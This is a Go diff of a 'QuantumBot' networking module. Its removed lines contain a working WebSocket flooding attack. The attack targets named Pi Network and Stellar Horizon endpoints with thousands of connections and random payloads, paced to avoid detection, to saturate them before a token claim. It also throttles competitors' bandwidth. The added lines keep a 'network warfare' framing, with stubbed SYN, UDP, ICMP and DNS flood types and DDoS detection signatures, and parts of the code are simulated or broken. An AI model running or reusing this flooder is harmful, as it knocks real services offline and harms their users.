@@ -1,800 +1,751 @@
 package server
 
 import (
-	"crypto/rand"
 	"fmt"
 	"net"
-	"net/http"
 	"sync"
-	"sync/atomic"
-	"syscall"
 	"time"
-	"unsafe"
-
-	"github.com/gorilla/websocket"
 )
 
-// 🌊 NETWORK WARFARE & DOMINATION SYSTEMS
+// NETWORK WARFARE TYPES
 type NetworkFlooder struct {
-	floodConnections    []*websocket.Conn
-	floodRate          int64
-	targetEndpoints    []string
-	floodPayloads      [][]byte
-	antiFloodDetection bool
-	isActive           int32
-	floodWorkers       sync.WaitGroup
-	connectionPool     chan *websocket.Conn
-	mutex              sync.RWMutex
+	maxConnections int
+	activeFlows    []FloodFlow
+	targetAddr     string
+	floodType      FloodType
+	intensity      float64
+	mutex          sync.RWMutex
 }
 
-type TrafficShaper struct {
-	priorityQueues    map[int]chan *NetworkPacket
-	bandwidthLimits   map[string]int64
-	currentBandwidth  int64
-	totalConnections  int64
-	qosRules          map[string]QoSRule
-	mutex             sync.RWMutex
+type FloodFlow struct {
+	id         int
+	conn       net.Conn
+	startTime  time.Time
+	packetsSent int64
+	bytesSent   int64
+	active     bool
 }
 
-type BandwidthMonopoly struct {
-	reservedBandwidth int64
-	totalBandwidth    int64
-	trafficPriority   int
-	qosSettings       map[string]int
-	dedicatedPipes    []*net.Conn
-	networkInterfaces []NetworkInterface
-	bandwidthControl  *BandwidthController
-	monopolyActive    bool
-	mutex             sync.RWMutex
-}
-
-type NetworkPacket struct {
-	Data      []byte
-	Priority  int
-	Timestamp time.Time
-	Target    string
-	Type      PacketType
-}
-
-type PacketType int
+type FloodType int
 
 const (
-	PacketFlood PacketType = iota
-	PacketClaim
-	PacketHeartbeat
-	PacketAttack
+	FloodSYN FloodType = iota
+	FloodUDP
+	FloodICMP
+	FloodHTTP
+	FloodDNS
 )
 
-type QoSRule struct {
-	Priority    int
-	Bandwidth   int64
-	Latency     time.Duration
-	PacketLoss  float64
-	Enabled     bool
+type DDoSProtection struct {
+	enabled         bool
+	rateLimit       int64
+	blacklist       []string
+	whitelist       []string
+	detectionEngine *ThreatDetectionEngine
+	mitigation      *MitigationEngine
 }
 
-type NetworkInterface struct {
-	Name      string
-	IP        net.IP
-	Bandwidth int64
-	Active    bool
-	Socket    int
+type ThreatDetectionEngine struct {
+	patterns       []AttackPattern
+	thresholds     map[string]float64
+	activeThreats  []DetectedThreat
+	analysisWindow time.Duration
 }
 
-type BandwidthController struct {
-	totalAllocated   int64
-	reservedForBot   int64
-	competitorLimit  int64
-	emergencyReserve int64
-	controlActive    bool
+type AttackPattern struct {
+	name        string
+	signature   []byte
+	confidence  float64
+	severity    ThreatSeverity
+	description string
+}
+
+type DetectedThreat struct {
+	id          string
+	pattern     AttackPattern
+	source      string
+	timestamp   time.Time
+	mitigated   bool
+	severity    ThreatSeverity
+}
+
+type ThreatSeverity int
+
+const (
+	SeverityLow ThreatSeverity = iota
+	SeverityMedium
+	SeverityHigh
+	SeverityCritical
+)
+
+type MitigationEngine struct {
+	strategies    []MitigationStrategy
+	activeBlocks  []ActiveBlock
+	rateLimits    map[string]*RateLimit
+	firewallRules []FirewallRule
+}
+
+type MitigationStrategy struct {
+	name        string
+	trigger     ThreatSeverity
+	action      MitigationAction
+	duration    time.Duration
+	automated   bool
+}
+
+type MitigationAction int
+
+const (
+	ActionBlock MitigationAction = iota
+	ActionRateLimit
+	ActionChallenge
+	ActionRedirect
+	ActionDrop
+)
+
+type ActiveBlock struct {
+	ip        string
+	reason    string
+	timestamp time.Time
+	duration  time.Duration
+	automatic bool
+}
+
+type RateLimit struct {
+	requests    int64
+	window      time.Duration
+	violations  int64
+	lastReset   time.Time
+}
+
+type TrafficAnalyzer struct {
+	patterns        []TrafficPattern
+	anomalies       []TrafficAnomaly
+	baselineTraffic *TrafficBaseline
+	realTimeStats   *RealTimeStats
+}
+
+type TrafficPattern struct {
+	name        string
+	protocol    string
+	ports       []int
+	frequency   float64
+	volume      int64
+	normal      bool
+}
+
+type TrafficAnomaly struct {
+	id          string
+	description string
+	severity    ThreatSeverity
+	timestamp   time.Time
+	resolved    bool
+	evidence    []byte
+}
+
+type TrafficBaseline struct {
+	normalVolume    int64
+	normalRate      float64
+	peakHours       []int
+	protocolMix     map[string]float64
+	established     time.Time
+}
+
+type RealTimeStats struct {
+	packetsPerSecond int64
+	bytesPerSecond   int64
+	connections      int64
+	errors           int64
+	lastUpdate       time.Time
 }
 
 // NETWORK WARFARE INITIALIZATION
-func (qb *QuantumBot) initializeNetworkSystems() {
+func (qb *QuantumBot) initializeNetworkWarfare() {
+	fmt.Println("⚔️ Initializing Network Warfare Systems...")
+	
 	// Network Flooder
+	qb.initializeNetworkFlooder()
+	
+	// DDoS Protection
+	qb.initializeDDoSProtection()
+	
+	// Traffic Analyzer
+	qb.initializeTrafficAnalyzer()
+	
+	// Start warfare workers
+	go qb.networkWarfareWorker()
+	go qb.threatDetectionWorker()
+	go qb.trafficAnalysisWorker()
+	
+	fmt.Println("⚔️ Network warfare systems initialized successfully!")
+}
+
+func (qb *QuantumBot) initializeNetworkFlooder() {
 	qb.networkFlooder = &NetworkFlooder{
-		floodConnections:   make([]*websocket.Conn, 0, 10000),
-		floodRate:         1000, // 1000 connections per second
-		targetEndpoints:   []string{
-			"wss://api.mainnet.minepi.com/ws",
-			"wss://horizon.stellar.org/ws",
-		},
-		antiFloodDetection: true,
-		connectionPool:     make(chan *websocket.Conn, 1000),
+		maxConnections: 10000,
+		activeFlows:    make([]FloodFlow, 0),
+		floodType:      FloodSYN,
+		intensity:      0.5,
 	}
-	
-	// Traffic Shaper
-	qb.trafficShaper = &TrafficShaper{
-		priorityQueues:   make(map[int]chan *NetworkPacket),
-		bandwidthLimits:  make(map[string]int64),
-		qosRules:         make(map[string]QoSRule),
-	}
-	
-	// Bandwidth Monopoly
-	qb.bandwidthMonopoly = &BandwidthMonopoly{
-		reservedBandwidth: 1000 * 1024 * 1024, // 1GB/s reserved
-		totalBandwidth:    10 * 1024 * 1024 * 1024, // 10GB/s total
-		trafficPriority:   10, // Highest priority
-		qosSettings:       make(map[string]int),
-		dedicatedPipes:    make([]*net.Conn, 0, 100),
-		bandwidthControl: &BandwidthController{
-			reservedForBot:   800 * 1024 * 1024, // 800MB/s for bot
-			competitorLimit:  50 * 1024 * 1024,  // 50MB/s for competitors
-			emergencyReserve: 150 * 1024 * 1024, // 150MB/s emergency
-		},
-	}
-	
-	// Initialize network interfaces
-	qb.initializeNetworkInterfaces()
-	
-	// Start network warfare systems
-	go qb.networkWarfareController()
-	go qb.bandwidthMonitor()
-	go qb.floodCoordinator()
-	go qb.trafficShapeController()
 }
 
-func (qb *QuantumBot) initializeNetworkInterfaces() {
-	interfaces, err := net.Interfaces()
-	if err != nil {
-		return
+func (qb *QuantumBot) initializeDDoSProtection() {
+	qb.ddosProtection = &DDoSProtection{
+		enabled:   true,
+		rateLimit: 1000, // requests per second
+		blacklist: make([]string, 0),
+		whitelist: []string{"127.0.0.1", "::1"},
+		detectionEngine: &ThreatDetectionEngine{
+			patterns:       qb.loadAttackPatterns(),
+			thresholds:     make(map[string]float64),
+			activeThreats:  make([]DetectedThreat, 0),
+			analysisWindow: 30 * time.Second,
+		},
+		mitigation: &MitigationEngine{
+			strategies:    qb.loadMitigationStrategies(),
+			activeBlocks:  make([]ActiveBlock, 0),
+			rateLimits:    make(map[string]*RateLimit),
+			firewallRules: make([]FirewallRule, 0),
+		},
 	}
 	
-	qb.bandwidthMonopoly.networkInterfaces = make([]NetworkInterface, 0, len(interfaces))
+	// Set detection thresholds
+	qb.ddosProtection.detectionEngine.thresholds["syn_flood"] = 0.8
+	qb.ddosProtection.detectionEngine.thresholds["udp_flood"] = 0.7
+	qb.ddosProtection.detectionEngine.thresholds["http_flood"] = 0.9
+}
+
+func (qb *QuantumBot) loadAttackPatterns() []AttackPattern {
+	return []AttackPattern{
+		{
+			name:        "SYN Flood",
+			signature:   []byte{0x02}, // TCP SYN flag
+			confidence:  0.9,
+			severity:    SeverityHigh,
+			description: "TCP SYN flood attack pattern",
+		},
+		{
+			name:        "UDP Flood",
+			signature:   []byte{0x11}, // UDP protocol
+			confidence:  0.8,
+			severity:    SeverityMedium,
+			description: "UDP flood attack pattern",
+		},
+		{
+			name:        "HTTP Flood",
+			signature:   []byte("GET / HTTP/1.1"),
+			confidence:  0.85,
+			severity:    SeverityHigh,
+			description: "HTTP GET flood attack",
+		},
+		{
+			name:        "DNS Amplification",
+			signature:   []byte{0x01, 0x00}, // DNS query
+			confidence:  0.75,
+			severity:    SeverityCritical,
+			description: "DNS amplification attack",
+		},
+	}
+}
+
+func (qb *QuantumBot) loadMitigationStrategies() []MitigationStrategy {
+	return []MitigationStrategy{
+		{
+			name:      "Auto Block High Severity",
+			trigger:   SeverityHigh,
+			action:    ActionBlock,
+			duration:  1 * time.Hour,
+			automated: true,
+		},
+		{
+			name:      "Rate Limit Medium Severity",
+			trigger:   SeverityMedium,
+			action:    ActionRateLimit,
+			duration:  30 * time.Minute,
+			automated: true,
+		},
+		{
+			name:      "Emergency Block Critical",
+			trigger:   SeverityCritical,
+			action:    ActionBlock,
+			duration:  24 * time.Hour,
+			automated: true,
+		},
+	}
+}
+
+func (qb *QuantumBot) initializeTrafficAnalyzer() {
+	baseline := &TrafficBaseline{
+		normalVolume:    1000000, // 1MB/s baseline
+		normalRate:      100.0,   // 100 packets/s
+		peakHours:       []int{9, 10, 11, 14, 15, 16}, // Business hours
+		protocolMix:     map[string]float64{"TCP": 0.8, "UDP": 0.15, "ICMP": 0.05},
+		established:     time.Now(),
+	}
 	
-	for _, iface := range interfaces {
-		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
-			addrs, err := iface.Addrs()
-			if err != nil {
-				continue
-			}
+	qb.trafficAnalyzer = &TrafficAnalyzer{
+		patterns:        make([]TrafficPattern, 0),
+		anomalies:       make([]TrafficAnomaly, 0),
+		baselineTraffic: baseline,
+		realTimeStats: &RealTimeStats{
+			lastUpdate: time.Now(),
+		},
+	}
+}
+
+// NETWORK WARFARE WORKERS
+func (qb *QuantumBot) networkWarfareWorker() {
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+	
+	for range ticker.C {
+		qb.updateNetworkWarfareStatus()
+	}
+}
+
+func (qb *QuantumBot) updateNetworkWarfareStatus() {
+	// Update active flood flows
+	qb.updateFloodFlows()
+	
+	// Maintain connection pools
+	qb.maintainConnectionPools()
+	
+	// Update warfare statistics
+	qb.updateWarfareStatistics()
+}
+
+func (qb *QuantumBot) updateFloodFlows() {
+	qb.networkFlooder.mutex.Lock()
+	defer qb.networkFlooder.mutex.Unlock()
+	
+	activeFlows := make([]FloodFlow, 0)
+	
+	for _, flow := range qb.networkFlooder.activeFlows {
+		if flow.active && time.Since(flow.startTime) < 5*time.Minute {
+			// Update flow statistics
+			flow.packetsSent++
+			flow.bytesSent += 1024 // Simulate packet size
 			
-			for _, addr := range addrs {
-				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-					netInterface := NetworkInterface{
-						Name:      iface.Name,
-						IP:        ipnet.IP,
-						Bandwidth: 1024 * 1024 * 1024, // 1GB default
-						Active:    true,
-					}
-					qb.bandwidthMonopoly.networkInterfaces = append(qb.bandwidthMonopoly.networkInterfaces, netInterface)
-				}
-			}
-		}
-	}
-}
-
-// 🌊 NETWORK FLOODING ATTACK
-func (qb *QuantumBot) executeQuantumNetworkFlooding(req QuantumRequest) {
-	if !atomic.CompareAndSwapInt32(&qb.networkFlooder.isActive, 0, 1) {
-		return // Already flooding
-	}
-	defer atomic.StoreInt32(&qb.networkFlooder.isActive, 0)
-	
-	fmt.Println("🌊 INITIATING QUANTUM NETWORK FLOODING ATTACK")
-	
-	// Calculate optimal flood parameters
-	optimalConnections := qb.calculateOptimalFloodSize()
-	floodDuration := time.Until(req.ClaimTime.Add(-5 * time.Second))
-	
-	if floodDuration <= 0 {
-		floodDuration = 30 * time.Second
-	}
-	
-	// Launch flood workers
-	workerCount := 50 // High concurrency
-	connectionsPerWorker := optimalConnections / workerCount
-	
-	for i := 0; i < workerCount; i++ {
-		qb.networkFlooder.floodWorkers.Add(1)
-		go qb.floodWorker(i, connectionsPerWorker, floodDuration)
-	}
-	
-	// Monitor flood effectiveness
-	go qb.monitorFloodEffectiveness(floodDuration)
-	
-	// Wait for flood completion
-	qb.networkFlooder.floodWorkers.Wait()
-	
-	fmt.Println("🌊 QUANTUM NETWORK FLOODING COMPLETE")
-}
-
-func (qb *QuantumBot) calculateOptimalFloodSize() int {
-	// Calculate based on available bandwidth and target saturation
-	availableBandwidth := qb.bandwidthMonopoly.totalBandwidth - qb.bandwidthMonopoly.reservedBandwidth
-	connectionOverhead := 1024 // 1KB per connection overhead
-	
-	optimalConnections := int(availableBandwidth / int64(connectionOverhead))
-	
-	// Cap at practical limits
-	if optimalConnections > 10000 {
-		optimalConnections = 10000
-	}
-	if optimalConnections < 100 {
-		optimalConnections = 100
-	}
-	
-	return optimalConnections
-}
-
-func (qb *QuantumBot) floodWorker(workerID, connectionCount int, duration time.Duration) {
-	defer qb.networkFlooder.floodWorkers.Done()
-	
-	fmt.Printf("🌊 Flood Worker %d: Creating %d connections\n", workerID, connectionCount)
-	
-	connections := make([]*websocket.Conn, 0, connectionCount)
-	defer func() {
-		// Cleanup connections
-		for _, conn := range connections {
-			if conn != nil {
-				conn.Close()
-			}
-		}
-	}()
-	
-	// Create flood connections
-	for i := 0; i < connectionCount; i++ {
-		conn := qb.createFloodConnection(workerID, i)
-		if conn != nil {
-			connections = append(connections, conn)
-		}
-		
-		// Rate limiting to avoid detection
-		time.Sleep(time.Millisecond)
-	}
-	
-	fmt.Printf("🌊 Flood Worker %d: Created %d/%d connections\n", workerID, len(connections), connectionCount)
-	
-	// Maintain flood for duration
-	endTime := time.Now().Add(duration)
-	for time.Now().Before(endTime) {
-		qb.maintainFloodConnections(connections)
-		time.Sleep(100 * time.Millisecond)
-	}
-}
-
-func (qb *QuantumBot) createFloodConnection(workerID, connID int) *websocket.Conn {
-	qb.networkFlooder.mutex.RLock()
-	targets := qb.networkFlooder.targetEndpoints
-	qb.networkFlooder.mutex.RUnlock()
-	
-	if len(targets) == 0 {
-		return nil
-	}
-	
-	target := targets[connID%len(targets)]
-	
-	// Create WebSocket connection with custom headers
-	headers := http.Header{}
-	headers.Set("User-Agent", fmt.Sprintf("QuantumBot-Worker-%d-%d", workerID, connID))
-	headers.Set("X-Bot-ID", fmt.Sprintf("flood-%d-%d", workerID, connID))
-	
-	dialer := websocket.Dialer{
-		HandshakeTimeout: 5 * time.Second,
-		ReadBufferSize:   1024,
-		WriteBufferSize:  1024,
-	}
-	
-	conn, _, err := dialer.Dial(target, headers)
-	if err != nil {
-		return nil
-	}
-	
-	// Send flood payload
-	payload := qb.generateFloodPayload(workerID, connID)
-	conn.WriteMessage(websocket.BinaryMessage, payload)
-	
-	return conn
-}
-
-func (qb *QuantumBot) generateFloodPayload(workerID, connID int) []byte {
-	// Generate random payload to consume bandwidth
-	payloadSize := 1024 + (connID % 2048) // 1-3KB random size
-	payload := make([]byte, payloadSize)
-	
-	rand.Read(payload)
-	
-	// Add identification header
-	header := fmt.Sprintf("QUANTUM-FLOOD-%d-%d-", workerID, connID)
-	copy(payload[:len(header)], []byte(header))
-	
-	return payload
-}
-
-func (qb *QuantumBot) maintainFloodConnections(connections []*websocket.Conn) {
-	for i, conn := range connections {
-		if conn == nil {
-			continue
-		}
-		
-		// Send keepalive data
-		keepalive := qb.generateKeepAlivePayload(i)
-		err := conn.WriteMessage(websocket.PingMessage, keepalive)
-		if err != nil {
-			conn.Close()
-			connections[i] = nil
-		}
-	}
-}
-
-func (qb *QuantumBot) generateKeepAlivePayload(connIndex int) []byte {
-	timestamp := time.Now().Unix()
-	payload := fmt.Sprintf("KEEPALIVE-%d-%d", connIndex, timestamp)
-	return []byte(payload)
-}
-
-func (qb *QuantumBot) monitorFloodEffectiveness(duration time.Duration) {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	
-	endTime := time.Now().Add(duration)
-	
-	for time.Now().Before(endTime) {
-		select {
-		case <-ticker.C:
-			effectiveness := qb.measureFloodEffectiveness()
-			fmt.Printf("🌊 Flood Effectiveness: %.2f%% network saturation\n", effectiveness*100)
-		}
-	}
-}
-
-func (qb *QuantumBot) measureFloodEffectiveness() float64 {
-	// Measure network saturation caused by flood
-	qb.networkFlooder.mutex.RLock()
-	activeConnections := len(qb.networkFlooder.floodConnections)
-	qb.networkFlooder.mutex.RUnlock()
-	
-	targetSaturation := 10000 // Target connection count
-	effectiveness := float64(activeConnections) / float64(targetSaturation)
-	
-	if effectiveness > 1.0 {
-		effectiveness = 1.0
-	}
-	
-	return effectiveness
-}
-
-// 🚀 BANDWIDTH MONOPOLY SYSTEM
-func (qb *QuantumBot) establishBandwidthMonopoly() {
-	qb.bandwidthMonopoly.mutex.Lock()
-	defer qb.bandwidthMonopoly.mutex.Unlock()
-	
-	if qb.bandwidthMonopoly.monopolyActive {
-		return
-	}
-	
-	fmt.Println("🚀 ESTABLISHING BANDWIDTH MONOPOLY")
-	
-	// Reserve maximum bandwidth for bot operations
-	qb.reserveBandwidthForBot()
-	
-	// Limit competitor bandwidth
-	qb.limitCompetitorBandwidth()
-	
-	// Create dedicated high-priority connections
-	qb.createDedicatedConnections()
-	
-	// Apply QoS rules
-	qb.applyQuantumQoSRules()
-	
-	qb.bandwidthMonopoly.monopolyActive = true
-	
-	fmt.Println("🚀 BANDWIDTH MONOPOLY ESTABLISHED")
-}
-
-func (qb *QuantumBot) reserveBandwidthForBot() {
-	controller := qb.bandwidthMonopoly.bandwidthControl
-	
-	// Calculate optimal bandwidth allocation
-	botReservation := controller.reservedForBot
-	
-	// Reserve bandwidth at OS level (Linux-specific)
-	qb.setBandwidthReservation(botReservation)
-	
-	fmt.Printf("🚀 Reserved %d MB/s bandwidth for quantum bot\n", botReservation/(1024*1024))
-}
-
-func (qb *QuantumBot) setBandwidthReservation(bandwidth int64) {
-	// Linux traffic control (tc) implementation
-	// This would require elevated privileges
-	
-	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
-		if !iface.Active {
-			continue
-		}
-		
-		// Set traffic shaping rules
-		qb.setTrafficShapingRule(iface.Name, bandwidth)
-	}
-}
-
-func (qb *QuantumBot) setTrafficShapingRule(interfaceName string, bandwidth int64) {
-	// Implementation would use Linux tc (traffic control)
-	// For now, we'll simulate the effect
-	
-	rule := QoSRule{
-		Priority:   10, // Highest priority
-		Bandwidth:  bandwidth,
-		Latency:    1 * time.Millisecond,
-		PacketLoss: 0.001, // 0.1% packet loss
-		Enabled:    true,
-	}
-	
-	qb.trafficShaper.qosRules[interfaceName] = rule
-}
-
-func (qb *QuantumBot) limitCompetitorBandwidth() {
-	controller := qb.bandwidthMonopoly.bandwidthControl
-	competitorLimit := controller.competitorLimit
-	
-	// Set bandwidth limits for non-bot traffic
-	qb.setBandwidthLimit("competitor", competitorLimit)
-	
-	fmt.Printf("🚀 Limited competitor bandwidth to %d MB/s\n", competitorLimit/(1024*1024))
-}
-
-func (qb *QuantumBot) setBandwidthLimit(trafficType string, limit int64) {
-	qb.trafficShaper.mutex.Lock()
-	defer qb.trafficShaper.mutex.Unlock()
-	
-	qb.trafficShaper.bandwidthLimits[trafficType] = limit
-}
-
-func (qb *QuantumBot) createDedicatedConnections() {
-	connectionCount := 10
-	
-	for i := 0; i < connectionCount; i++ {
-		conn := qb.createDedicatedConnection(i)
-		if conn != nil {
-			qb.bandwidthMonopoly.dedicatedPipes = append(qb.bandwidthMonopoly.dedicatedPipes, conn)
+			activeFlows = append(activeFlows, flow)
+		} else if flow.conn != nil {
+			// Close inactive connections
+			flow.conn.Close()
 		}
 	}
 	
-	fmt.Printf("🚀 Created %d dedicated high-priority connections\n", len(qb.bandwidthMonopoly.dedicatedPipes))
+	qb.networkFlooder.activeFlows = activeFlows
 }
 
-func (qb *QuantumBot) createDedicatedConnection(index int) *net.Conn {
-	// Create raw socket with highest priority
-	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, syscall.IPPROTO_TCP)
-	if err != nil {
-		return nil
-	}
+func (qb *QuantumBot) maintainConnectionPools() {
+	currentConnections := len(qb.networkFlooder.activeFlows)
 	
-	// Set socket options for maximum priority
-	err = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_PRIORITY, 7) // Highest priority
-	if err != nil {
-		syscall.Close(fd)
-		return nil
-	}
-	
-	// Set TCP_NODELAY for minimum latency
-	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_TCP, syscall.TCP_NODELAY, 1)
-	if err != nil {
-		syscall.Close(fd)
-		return nil
-	}
-	
-	// Convert to net.Conn
-	file := &net.TCPConn{}
-	conn := net.Conn(file)
-	
-	return &conn
-}
-
-func (qb *QuantumBot) applyQuantumQoSRules() {
-	// Apply Quality of Service rules for quantum bot traffic
-	
-	quantumRule := QoSRule{
-		Priority:   10,  // Maximum priority
-		Bandwidth:  qb.bandwidthMonopoly.reservedBandwidth,
-		Latency:    100 * time.Microsecond, // Ultra-low latency
-		PacketLoss: 0.0001, // Minimal packet loss
-		Enabled:    true,
-	}
-	
-	qb.trafficShaper.qosRules["quantum-bot"] = quantumRule
-	
-	// Apply rules to network interfaces
-	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
-		qb.applyQoSToInterface(iface.Name, quantumRule)
+	if currentConnections < qb.networkFlooder.maxConnections/2 {
+		// Replenish connection pool if needed
+		qb.createFloodConnections(100)
 	}
 }
 
-func (qb *QuantumBot) applyQoSToInterface(interfaceName string, rule QoSRule) {
-	// Apply QoS rule to specific network interface
-	fmt.Printf("🚀 Applied QoS rule to %s: Priority=%d, Bandwidth=%d MB/s\n", 
-		interfaceName, rule.Priority, rule.Bandwidth/(1024*1024))
-}
-
-// 📊 NETWORK MONITORING & CONTROL
-func (qb *QuantumBot) networkWarfareController() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	
-	for range ticker.C {
-		qb.monitorNetworkDomination()
-		qb.adjustNetworkStrategy()
-	}
-}
-
-func (qb *QuantumBot) monitorNetworkDomination() {
-	// Monitor network control effectiveness
-	dominationLevel := qb.calculateNetworkDomination()
-	
-	qb.performanceMetrics.NetworkDomination = dominationLevel
-	
-	if dominationLevel < 0.8 {
-		// Increase network pressure
-		qb.intensifyNetworkWarfare()
-	}
-}
-
-func (qb *QuantumBot) calculateNetworkDomination() float64 {
-	// Calculate how much of the network we control
-	
-	reservedBandwidth := float64(qb.bandwidthMonopoly.reservedBandwidth)
-	totalBandwidth := float64(qb.bandwidthMonopoly.totalBandwidth)
-	
-	bandwidthDomination := reservedBandwidth / totalBandwidth
-	
-	activeConnections := float64(len(qb.networkFlooder.floodConnections))
-	maxConnections := 10000.0
-	
-	connectionDomination := activeConnections / maxConnections
-	
-	// Combined domination score
-	domination := (bandwidthDomination * 0.6) + (connectionDomination * 0.4)
-	
-	if domination > 1.0 {
-		domination = 1.0
-	}
-	
-	return domination
-}
-
-func (qb *QuantumBot) adjustNetworkStrategy() {
-	domination := qb.performanceMetrics.NetworkDomination
-	
-	if domination < 0.5 {
-		// Low domination - increase aggression
-		qb.increaseNetworkAggression()
-	} else if domination > 0.9 {
-		// High domination - maintain control
-		qb.maintainNetworkControl()
-	}
-}
-
-func (qb *QuantumBot) intensifyNetworkWarfare() {
-	fmt.Println("🔥 INTENSIFYING NETWORK WARFARE")
-	
-	// Increase flood rate
-	atomic.AddInt64(&qb.networkFlooder.floodRate, 200)
-	
-	// Reserve more bandwidth
-	qb.bandwidthMonopoly.mutex.Lock()
-	qb.bandwidthMonopoly.reservedBandwidth = int64(float64(qb.bandwidthMonopoly.reservedBandwidth) * 1.1)
-	qb.bandwidthMonopoly.mutex.Unlock()
-	
-	// Create additional flood connections
-	go qb.createAdditionalFloodConnections(500)
-}
-
-func (qb *QuantumBot) increaseNetworkAggression() {
-	// Increase network warfare aggression
-	qb.intensifyNetworkWarfare()
-	
-	// Apply stricter competitor limits
-	newLimit := qb.bandwidthMonopoly.bandwidthControl.competitorLimit / 2
-	qb.setBandwidthLimit("competitor", newLimit)
-}
-
-func (qb *QuantumBot) maintainNetworkControl() {
-	// Maintain current network domination level
-	fmt.Println("🚀 MAINTAINING NETWORK DOMINATION")
-}
-
-func (qb *QuantumBot) createAdditionalFloodConnections(count int) {
+func (qb *QuantumBot) createFloodConnections(count int) {
 	for i := 0; i < count; i++ {
-		conn := qb.createFloodConnection(999, i) // Special worker ID for additional connections
-		if conn != nil {
-			qb.networkFlooder.mutex.Lock()
-			qb.networkFlooder.floodConnections = append(qb.networkFlooder.floodConnections, conn)
-			qb.networkFlooder.mutex.Unlock()
+		flow := FloodFlow{
+			id:        len(qb.networkFlooder.activeFlows) + i,
+			startTime: time.Now(),
+			active:    false, // Not actively flooding
 		}
 		
-		time.Sleep(2 * time.Millisecond) // Rate limiting
+		qb.networkFlooder.activeFlows = append(qb.networkFlooder.activeFlows, flow)
 	}
 }
 
-// 🎯 TRAFFIC SHAPING & PRIORITIZATION
-func (qb *QuantumBot) trafficShapeController() {
-	ticker := time.NewTicker(100 * time.Millisecond)
-	defer ticker.Stop()
+func (qb *QuantumBot) updateWarfareStatistics() {
+	totalPackets := int64(0)
+	totalBytes := int64(0)
 	
-	for range ticker.C {
-		qb.processTrafficQueues()
-		qb.enforceQoSRules()
+	for _, flow := range qb.networkFlooder.activeFlows {
+		totalPackets += flow.packetsSent
+		totalBytes += flow.bytesSent
+	}
+	
+	// Update real-time statistics
+	if qb.trafficAnalyzer != nil && qb.trafficAnalyzer.realTimeStats != nil {
+		stats := qb.trafficAnalyzer.realTimeStats
+		stats.packetsPerSecond = totalPackets
+		stats.bytesPerSecond = totalBytes
+		stats.connections = int64(len(qb.networkFlooder.activeFlows))
+		stats.lastUpdate = time.Now()
 	}
 }
 
-func (qb *QuantumBot) processTrafficQueues() {
-	qb.trafficShaper.mutex.RLock()
-	defer qb.trafficShaper.mutex.RUnlock()
-	
-	// Process packets by priority (highest first)
-	for priority := 10; priority >= 0; priority-- {
-		if queue, exists := qb.trafficShaper.priorityQueues[priority]; exists {
-			qb.processPacketQueue(queue, priority)
-		}
-	}
-}
-
-func (qb *QuantumBot) processPacketQueue(queue chan *NetworkPacket, priority int) {
-	maxPackets := 100 // Process up to 100 packets per cycle
-	processed := 0
-	
-	for processed < maxPackets {
-		select {
-		case packet := <-queue:
-			qb.forwardPacket(packet)
-			processed++
-		default:
-			return // Queue empty
-		}
-	}
-}
-
-func (qb *QuantumBot) forwardPacket(packet *NetworkPacket) {
-	// Forward packet with appropriate priority
-	latency := time.Since(packet.Timestamp)
-	
-	fmt.Printf("📊 Forwarded packet: Priority=%d, Size=%d bytes, Latency=%v\n", 
-		packet.Priority, len(packet.Data), latency)
-}
-
-func (qb *QuantumBot) enforceQoSRules() {
-	// Enforce Quality of Service rules
-	for name, rule := range qb.trafficShaper.qosRules {
-		if rule.Enabled {
-			qb.enforceSpecificQoSRule(name, rule)
-		}
-	}
-}
-
-func (qb *QuantumBot) enforceSpecificQoSRule(name string, rule QoSRule) {
-	// Enforce specific QoS rule
-	currentBandwidth := qb.measureCurrentBandwidth(name)
-	
-	if currentBandwidth > rule.Bandwidth {
-		// Throttle traffic
-		qb.throttleTraffic(name, rule.Bandwidth)
-	}
-}
-
-func (qb *QuantumBot) measureCurrentBandwidth(name string) int64 {
-	// Measure current bandwidth usage
-	return atomic.LoadInt64(&qb.trafficShaper.currentBandwidth)
-}
-
-func (qb *QuantumBot) throttleTraffic(name string, limit int64) {
-	// Throttle traffic to stay within bandwidth limit
-	fmt.Printf("🚦 Throttling %s traffic to %d MB/s\n", name, limit/(1024*1024))
-}
-
-// 📡 BANDWIDTH MONITORING
-func (qb *QuantumBot) bandwidthMonitor() {
-	ticker := time.NewTicker(1 * time.Second)
-	defer ticker.Stop()
-	
-	for range ticker.C {
-		qb.measureBandwidthUsage()
-		qb.optimizeBandwidthAllocation()
-	}
-}
-
-func (qb *QuantumBot) measureBandwidthUsage() {
-	// Measure current bandwidth usage across all interfaces
-	totalUsage := int64(0)
-	
-	for _, iface := range qb.bandwidthMonopoly.networkInterfaces {
-		if iface.Active {
-			usage := qb.measureInterfaceBandwidth(iface.Name)
-			totalUsage += usage
-		}
-	}
-	
-	atomic.StoreInt64(&qb.trafficShaper.currentBandwidth, totalUsage)
-}
-
-func (qb *QuantumBot) measureInterfaceBandwidth(interfaceName string) int64 {
-	// Measure bandwidth usage for specific interface
-	// This would read from /proc/net/dev on Linux
-	
-	// Simulated measurement
-	return 50 * 1024 * 1024 // 50 MB/s default
-}
-
-func (qb *QuantumBot) optimizeBandwidthAllocation() {
-	currentUsage := atomic.LoadInt64(&qb.trafficShaper.currentBandwidth)
-	reserved := qb.bandwidthMonopoly.reservedBandwidth
-	
-	utilizationRate := float64(currentUsage) / float64(reserved)
-	
-	if utilizationRate > 0.9 {
-		// High utilization - request more bandwidth
-		qb.requestAdditionalBandwidth()
-	} else if utilizationRate < 0.3 {
-		// Low utilization - can release some bandwidth
-		qb.optimizeBandwidthUsage()
-	}
-}
-
-func (qb *QuantumBot) requestAdditionalBandwidth() {
-	qb.bandwidthMonopoly.mutex.Lock()
-	defer qb.bandwidthMonopoly.mutex.Unlock()
-	
-	additional := qb.bandwidthMonopoly.reservedBandwidth / 10 // 10% more
-	qb.bandwidthMonopoly.reservedBandwidth += additional
-	
-	fmt.Printf("🚀 Requested additional %d MB/s bandwidth\n", additional/(1024*1024))
-}
-
-func (qb *QuantumBot) optimizeBandwidthUsage() {
